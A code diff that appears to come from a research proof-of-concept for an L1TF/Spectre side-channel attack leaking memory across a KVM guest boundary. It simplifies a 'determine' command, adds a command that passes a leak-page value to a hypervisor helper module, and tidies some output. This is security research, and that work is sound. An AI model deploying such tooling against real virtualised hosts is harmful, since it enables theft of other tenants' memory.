@@ -154,13 +154,7 @@ size_t find_min(void *buf) {
   return 0;
 }
 
-void cmd_determine(void *leak_page) {
-  uint64_t old_page_value = *(uint64_t *)leak_page;
-  *(uint64_t *)leak_page = page_value;
-  getchar();
-  access_buffer_with_spectre(leak_page, 1, 1);
-  *(uint64_t *)leak_page = old_page_value;
-}
+void cmd_determine(void *leak_page) { access_buffer_with_spectre(leak_page, 1, 1); }
 
 void cmd_calc(int argc, char *argv[argc]) {
   if (argc < 2) {
@@ -255,6 +249,32 @@ void cmd_access_min(int argc, char *argv[argc]) {
   close(fd);
 }
 
+void cmd_inform_kvm_assist(int argc, char *argv[argc]) {
+  if (argc < 1) {
+    errno = EINVAL;
+    err(EXIT_FAILURE, "Need a value of page contents in VM");
+  }
+
+  char *endptr = NULL;
+  uint64_t value = strtoull(argv[0], &endptr, 16);
+  if (endptr == argv[0]) {
+    err(EXIT_FAILURE, "Could not parse value");
+  }
+  printf("Read value 0x%lx\n", value);
+
+  const char *path = "/proc/kvm_assist/search_for_page";
+  int fd = open(path, O_WRONLY);
+  if (fd < 0) {
+    err(EXIT_FAILURE, "Failed to open %s", path);
+  }
+  int b = write(fd, &value, sizeof(value));
+  if (b < 0) {
+    err(EXIT_FAILURE, "Failed to write to %s", path);
+  }
+  close(fd);
+  printf("Succesfully informed kvm_assist module of the value of the leak page\n");
+}
+
 void pin_cpu(void) {
   unsigned int cpu = 0;
   if (getcpu(&cpu, NULL) == -1) {
@@ -270,6 +290,7 @@ void pin_cpu(void) {
 void usage(void) {
   warnx("Unknown command! Supported commands are\n"
         "\tdetermine\n"
+        "\tinform_kvm_assist\n"
         "\tcalc\n"
         "\ttest_specte\n"
         "\taccess_min\n"
@@ -292,15 +313,17 @@ int main(int argc, char *argv[argc]) {
 
   void *leak_page = l1tf_spawn_leak_page();
   printf("Spawned leak page: ");
-  for (size_t i = 0; i < 8; ++i) {
+  for (size_t i = 0; i < sizeof(uint64_t); ++i) {
     printf("%02x ", ((unsigned char *)leak_page)[i]);
   }
-  printf("\n");
+  printf("(0x%lx)\n", (*(uint64_t *)leak_page));
 
   // Use this to get physical address of the leak page with the
   // kvm_assist.ko module in the hypervisor
   if (!strcmp(argv[1], "determine")) {
     cmd_determine(leak_page);
+  } else if (!strcmp(argv[1], "inform_kvm_assist")) {
+    cmd_inform_kvm_assist(argc - 2, &argv[2]);
   } else if (!strcmp(argv[1], "calc")) {
     cmd_calc(argc - 2, &argv[2]);
   } else if (!strcmp(argv[1], "test_spectre")) {
